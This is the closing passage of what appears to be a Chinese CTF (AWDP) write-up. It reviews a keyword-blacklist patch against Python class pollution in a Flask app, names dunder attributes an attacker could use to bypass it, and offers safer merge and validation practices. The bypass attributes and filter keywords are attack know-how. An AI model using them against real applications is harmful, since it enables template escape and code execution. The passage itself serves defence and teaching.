**修复分析：** 增加了 `secret` 、 `key` 、 `admin` 、 `proto` 、 `constructor` 等关键词，并保留了 `_` 。这确实能阻断我们之前利用Unicode转义进行污染的攻击路径，因为下划线被禁了。同时，在路由中也增加了对 `adminer` 和 `admin` 用户名的直接退出操作。

**但黑名单的局限性：**

1. **可能被绕过** ：Unicode转义只是绕过方式之一。攻击者可能寻找不在名单里的魔术方法或属性，如 `__subclasses__` 、 `__mro__` 、 `__bases__` 、 `__globals__` 等。虽然 `_` 被禁，但攻击者可能利用其他特性（如Python的 `[]` 操作符重载 `__getitem__` ）来触发代码执行。
2. **影响功能** ：过度过滤可能影响正常的业务逻辑，如果业务确实需要传输包含这些关键词的合法数据。

**更根本的修复方案：**

1. **避免不安全的递归合并** ： `merge` 函数是万恶之源。除非绝对必要，否则不要实现这种将用户输入的字典递归合并到应用程序对象的功能。如果必须要有类似功能，应该：
	- **使用安全的合并函数** ，例如只合并特定的、预定义的键。
		- **深度复制（Deep Copy）目标对象** ，在副本上进行合并，避免污染原对象。
		- **使用不可变数据结构** 。
2. **严格限制反序列化/数据加载的来源** ： `json.loads(request.data)` 直接反序列化用户输入是危险的。应确保反序列化的数据是预期的结构，并且只包含允许的键。可以使用JSON Schema进行验证。
3. **使用安全的模板渲染** ：确保传递给 `render_template` 的所有变量都是安全的，不要将用户输入直接传递给模板引擎。对于Flask，默认的Jinja2环境已经对模板进行了沙盒处理，但通过污染全局对象仍可能逃逸。可以考虑使用更严格的沙盒环境。
4. **最小权限原则** ：运行Flask应用的进程应具有最小必要的文件系统权限和网络权限。

**修复后的merge函数示例（理念）：**

```python
def safe_merge(user_dict, allowed_keys):

    “““只允许合并预定义的键，且值类型受控”“”

    safe_dict = {}

    for key in allowed_keys:

        if key in user_dict:

            # 这里可以对value进行类型检查和净化

            if isinstance(user_dict[key], str) and len(user_dict[key]) < 100:

                safe_dict[key] = user_dict[key]

            # 对于复杂类型，应格外小心，最好禁止

    # 然后使用safe_dict来更新配置，而不是直接合并到对象

    # config.update(safe_dict)

    return safe_dict
python
```

打完这场AWDP，最大的感受就是，安全是一个整体，任何一个环节的“粗心”都可能成为突破口。从源码泄露这种低级错误，到文件上传过滤的逻辑缺陷，再到原型链污染这种较高级的漏洞，它们都源于对用户输入的不信任处理。作为开发者，一定要时刻牢记“所有输入都是有害的”；作为安全人员，则要养成多角度思考的习惯，不放过任何一处可疑的数据处理点。希望这篇实战复盘能给大家带来一些启发，在下次遇到类似场景时，能更快地找到那条通往flag的路。